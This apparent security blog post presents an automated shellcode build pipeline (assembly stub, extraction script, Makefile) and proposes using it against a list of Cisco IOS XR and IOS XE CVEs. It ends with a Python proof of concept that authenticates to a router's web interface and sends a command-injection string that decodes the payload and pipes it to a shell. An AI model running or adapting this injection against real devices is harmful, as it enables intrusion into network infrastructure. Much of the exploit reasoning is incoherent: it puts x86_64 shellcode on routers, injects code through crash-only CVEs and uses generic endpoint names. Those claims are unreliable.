# Theoretical Automated Shellcode Generation for Cisco ASR 9010 Vulnerability Research

## Introduction

In the world of vulnerability research, especially targeting infrastructure-grade devices like the Cisco ASR 9010, one of the most critical and time-saving tasks is automated shellcode generation. This post walks through how to programmatically build and extract shellcode using a custom toolchain, then weaponize it against real-world vulnerabilities—including CVE-2023-20198 and several others impacting Cisco IOS XR and IOS XE.

We start with a compact x86\_64 shellcode stub in assembly, demonstrate how to compile and extract it, and integrate it into an exploit pipeline suitable for fuzzing and proof-of-concept weaponization.

---

## Shellcode Stub: `build_shellcode.c`

```c
__asm__(
    ".global shellcode_start\n"
    "shellcode_start:\n"
    "    xor %rax, %rax\n"
    "    mov $1, %rdi\n"
    "    call get_msg\n"
    "get_msg:\n"
    "    pop %rsi\n"
    "    mov $8, %rdx\n"
    "    mov $1, %rax\n"
    "    syscall\n"
    "    xor %rdi, %rdi\n"
    "    mov $60, %rax\n"
    "    syscall\n"
    "    .ascii \"deadbeef\"\n"
    ".global shellcode_end\n"
    "shellcode_end:\n"
);
```

This shellcode prints `deadbeef` to `stdout` and then exits cleanly. It's compact, testable, and ideal for injection payload testing.

---

## Extraction Script: `extract_shellcode.sh`

```bash
#!/bin/bash

set -e

OBJFILE="$1"
OUTFILE="$2"

if [ -z "$OBJFILE" ] || [ -z "$OUTFILE" ]; then
    echo "Usage: $0 <object.o> <output.bin>"
    exit 1
fi

TMPFILE=$(mktemp)
gobjcopy --dump-section .text="$TMPFILE" "$OBJFILE"

START_HEX=$(nm "$OBJFILE" | awk '/shellcode_start/ {print $1}')
END_HEX=$(nm "$OBJFILE" | awk '/shellcode_end/ {print $1}')

START_DEC=$((0x$START_HEX))
END_DEC=$((0x$END_HEX))
LENGTH=$((END_DEC - START_DEC))

dd if="$TMPFILE" of="$OUTFILE" bs=1 skip="$START_DEC" count="$LENGTH" status=none
echo "[*] Wrote $OUTFILE ($LENGTH bytes)"
rm -f "$TMPFILE"
```

This script extracts raw shellcode from a compiled object, bounded by the `shellcode_start` and `shellcode_end` labels.

---

## Makefile Pipeline

```makefile
CC=clang
CFLAGS=-Wall -Wextra -O2 -c

all: encoded_shellcode.txt

build_shellcode.o: build_shellcode.c
	$(CC) $(CFLAGS) -o $@ $<

raw_shellcode.bin: build_shellcode.o
	@start=$$(nm $< | awk '/shellcode_start/ {print $$1}'); \
	end=$$(nm $< | awk '/shellcode_end/ {print $$1}'); \
	start_dec=$$((0x$$start)); \
	end_dec=$$((0x$$end)); \
	len=$$((end_dec - start_dec)); \
	xxd -p -c1 $< | tail -n +$$((start_dec + 1)) | head -n $$len | xxd -r -p > $@

encode_shellcode: encode_shellcode.c
	$(CC) -O2 -o $@ $<

encoded_shellcode.txt: encode_shellcode raw_shellcode.bin
	./encode_shellcode raw_shellcode.bin > encoded_shellcode.txt

clean:
	rm -f build_shellcode.o encode_shellcode raw_shellcode.bin encoded_shellcode.txt
```

This fully automates extraction and optional encoding into a format usable for ROP chains or reverse shells.

---

## Application: Real Cisco CVEs

With `encoded_shellcode.txt` in hand, the payload can be dropped into actual exploit codebases. Here's a quick prioritization of Cisco ASR 9010-related vulnerabilities and ideas for PoC integration:

### 1. [CVE-2024-20327](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxr-pppma-JKWFgneW)

Denial via PPPoE termination crash—test with malformed sessions, embed encoded shellcode into control message options.

### 2. [CVE-2021-34713](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-npspin-QYpwdhFD.html)

L2 punt crash—simulate malformed punted traffic to trigger line card reloads.

### 3. [CVE-2022-20919](https://nvd.nist.gov/vuln/detail/CVE-2022-20919)

Craft malformed CIP packets. Shellcode inserted via fuzzed options.

### 4. [CVE-2015-6301](https://www.cisco.com/c/en/us/support/docs/csa/Cisco-SA-20150918-CVE-2015-6301.html)

Exploit the DHCPv6 relay crash vector to trigger shellcode-based watchdog bypass or extended reboot.

### 5. [CVE-2023-20198](https://vulnera.com/newswire/proof-of-concept-exploit-code-released-for-critical-cisco-ios-xe-vulnerability/)

**Command injection in web UI**. Drop shellcode into uploaded scripts or command arguments.

### 6. [CVE-2024-20295](https://www.techtarget.com/searchsecurity/news/366581456/Cisco-discloses-high-severity-vulnerability-PoC-available)

Use authenticated CLI injection to elevate and execute extracted payloads.

### 7. [CVE-2020-3452](https://www.rapid7.com/blog/post/2020/07/23/cve-2020-3452-cisco-asa-firepower-read-only-path-traversal-vulnerability-what-you-need-to-know/)

Path traversal can help read memory dumps to validate shellcode injection success.

---

Conclusion: The Case for Automation in Router Exploitation

This automation approach drastically cuts down development time in exploit chains, allowing you to focus on delivery vectors and post-exploitation. While each CVE will require tailored payloads, having a flexible shellcode build-and-extract pipeline unlocks rapid iteration cycles for testing against live or emulated devices.

For future work, integrating this shellcode automation into a Ghidra or Binary Ninja plugin could streamline reverse engineering workflows even further.

    Disclaimer: This blog post is for educational and ethical security research purposes only. Unauthorized access or tampering with networks you don't own or have permission to test is illegal.

PoC: Exploiting CVE-2025-20186

# poc_cve_2025_20186.py
# Demonstrates exploiting CVE-2025-20186 via command injection
``` python
import requests

TARGET = "https://192.168.1.1"
USERNAME = "lobby_ambassador"
PASSWORD = "password123"

# Read the encoded shellcode
with open("encoded_shellcode.txt", "r") as f:
    shellcode = f.read().strip()

# Construct the injection payload
injection = f"; echo '{shellcode}' | base64 -d | ./sh > /dev/null 2>&1;"

# Authenticate and obtain session
session = requests.Session()
login_data = {
    "username": USERNAME,
    "password": PASSWORD
}
session.post(f"{TARGET}/login.cgi", data=login_data, verify=False)

# Send the exploit
payload = {
    "cmd": injection
}
response = session.post(f"{TARGET}/exec.cgi", data=payload, verify=False)

print(f"[*] Response Code: {response.status_code}")
print("[*] Exploit Sent")
```

This PoC targets the CVE-2025-20186 vulnerability, which allows an authenticated attacker with a lobby ambassador account to perform command injection attacks via the web-based management interface of Cisco IOS XE Software.

Happy hacking, and stay safe out there.
